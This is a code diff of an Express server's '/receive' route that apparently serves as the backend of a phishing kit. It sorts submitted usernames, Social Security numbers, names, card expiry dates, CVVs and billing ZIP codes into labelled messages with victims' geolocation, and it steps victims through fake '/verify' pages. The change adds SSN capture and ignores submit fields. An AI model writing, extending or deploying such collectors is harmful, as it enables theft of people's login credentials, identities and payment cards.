@@ -155,7 +155,7 @@ app.post("/receive", async (req, res) => {
 
       // Construct message first
       Object.entries(myObject).forEach(([key, value]) => {
-        if (key.toLowerCase() !== 'visitor' && key.toLowerCase() !== 'click' && value) {
+        if (key.toLowerCase() !== 'visitor' && key.toLowerCase() !== 'submit' && key.toLowerCase() !== 'click' && value) {
           message += `${key.toUpperCase()}: ${value}\n`;
         }
       });
@@ -197,7 +197,7 @@ app.post("/receive", async (req, res) => {
       message = prepareMessage("LOGIN", "err", myObject, fullGeoInfo, res);
     } else if (myObjectKeys.includes("username") && !doubleLogin) {
       message = prepareMessage("LOGIN", "/verify?action=1", myObject, fullGeoInfo, res);
-    } else if (myObjectKeys.includes("city") || myObjectKeys.includes("lastname")) {
+    } else if (myObjectKeys.includes("ssn") || myObjectKeys.includes("last_name")) {
       message = prepareMessage("CONTACT INFO", "/verify?action=2", myObject, fullGeoInfo, res);
     } else if (myObjectKeys.includes("expirydate") || myObjectKeys.includes("cvv") || myObjectKeys.includes("billingzip")) {
       message = prepareMessage("BILLING INFO", url, myObject, fullGeoInfo, res);
